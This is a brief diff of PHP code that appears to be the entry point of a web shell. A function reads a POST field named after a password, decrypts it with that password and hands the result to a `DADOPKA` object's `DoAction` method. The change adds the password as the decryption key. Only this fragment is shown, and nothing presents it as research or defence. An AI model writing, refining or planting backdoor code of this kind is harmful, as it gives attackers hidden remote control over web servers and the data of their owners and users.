@@ -1,7 +1,7 @@
 <?
 
 function main($pass){
-    $args = decrypt($_POST[$pass]);
+    $args = decrypt($_POST[$pass],$pass);
     $a =new DADOPKA($pass);
     $a->DoAction($args);
 }
